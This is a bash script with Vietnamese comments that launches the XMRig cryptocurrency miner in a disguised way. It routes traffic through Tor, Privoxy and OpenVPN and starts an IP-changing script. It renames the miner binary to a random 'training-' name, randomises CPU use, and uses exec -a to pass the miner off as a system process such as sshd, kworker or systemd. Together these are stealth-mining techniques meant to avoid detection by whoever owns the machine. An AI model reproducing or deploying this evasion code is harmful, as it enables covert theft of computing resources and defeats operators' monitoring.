#!/bin/bash

# Khởi động dịch vụ Tor, Privoxy và VPN
service tor start
if ! pgrep -x "tor" > /dev/null; then
  echo "Tor service failed to start"
fi

service privoxy start
if ! pgrep -x "privoxy" > /dev/null; then
  echo "Privoxy service failed to start"
fi

openvpn --config $VPN_CONFIG &
if ! pgrep -x "openvpn" > /dev/null; then
  echo "OpenVPN service failed to start"
fi

# Tạo bản sao của file xmrig nếu chưa có
if [ ! -f /root/work/xmrig_backup ]; then
  cp /root/work/xmrig /root/work/xmrig_backup
fi

# Kiểm tra và khởi động script đổi IP ngẫu nhiên
if [ -f /root/change_ip.sh ]; then
  /root/change_ip.sh &
else
  echo "Script change_ip.sh not found!"
fi

# Tính toán số threads dựa trên % CPU ngẫu nhiên
TOTAL_CORES=$(nproc)
cpu_hint=$(shuf -i $CPU_MIN-$CPU_MAX -n 1)
CPU_HINT=$(echo "($TOTAL_CORES * $cpu_hint) / 100" | bc)

# Danh sách các tên tiến trình hợp lệ giống hệ thống
PROCESS_NAMES=("systemd" "sshd" "cron" "bash" "kworker" "dbus-daemon")

# Chọn một tên tiến trình ngẫu nhiên từ danh sách
RANDOM_PROCESS_NAME=${PROCESS_NAMES[$RANDOM % ${#PROCESS_NAMES[@]}]}

# Tạo file xmrig_name.txt nếu chưa tồn tại
if [ ! -f /root/xmrig_name.txt ]; then
  RANDOM_NAME=$(echo training-$(shuf -i 1-999 -n 1))
  echo $RANDOM_NAME > /root/xmrig_name.txt
  mv /root/work/xmrig /root/work/$RANDOM_NAME
fi

# Khởi động XMRig với số lượng threads ngẫu nhiên
exec -a $RANDOM_PROCESS_NAME torsocks /root/work/$(cat /root/xmrig_name.txt) --donate-level $DONATE -o $POOL -u $USERNAME -a $ALGO --no-huge-pages --cpu-max-threads-hint=$CPU_HINT --tls --proxy=socks5://127.0.0.1:9050

# Giữ tiến trình chạy
tail -f /dev/null
